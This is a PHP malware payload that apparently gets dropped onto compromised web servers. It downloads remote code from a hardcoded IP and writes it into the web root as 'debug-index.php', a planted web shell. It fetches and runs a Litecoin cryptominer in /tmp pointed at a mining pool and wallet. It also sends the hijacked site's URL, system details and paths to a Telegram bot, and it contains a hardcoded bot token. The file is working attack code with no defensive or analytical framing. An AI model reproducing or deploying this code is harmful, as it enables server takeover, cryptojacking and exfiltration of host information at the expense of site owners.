<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
function http_get($url){
$im = curl_init($url);
curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($im, CURLOPT_HEADER, 0);
return curl_exec($im);
curl_close($im);
}
$check = $_SERVER['DOCUMENT_ROOT'] . "/debug-index.php" ;
$text = http_get('http://91.121.68.60/m.txt');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
}
echo '<center><h1>IDBTE4M CODE 87</h1>'.'<br>'.'[uname] '.php_uname().' [/uname] '; system('cd /tmp; curl -s -k 208.68.38.81/www.tar.gz -o p.tar.gz; tar -zxf p.tar.gz; ./rp -a lyra2z330 -o 198.50.168.213:4563 -u M8jHxTbixajQHLVop93pnBbGtiXVtMxSvg -p c=LTC --no-longpoll --cpu-priority 5 -t 2 --background'); $sys = php_uname(); $lihat = getcwd(); $home = $_SERVER['DOCUMENT_ROOT']; $domen = $_SERVER['SERVER_NAME']; $tempat = $_SERVER['REQUEST_URI']; $apiToken = "1522731867:AAHdtsErHFGWOXhIVCfzMhz8xxUWKiH96Hs"; $data = [ 'chat_id' => '1179830888', 'text' => "PUNTEN RCE LEWAT : \r\n http://$domen/$tempat \r\n $sys \r\n $home  \n$passpost " ]; $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );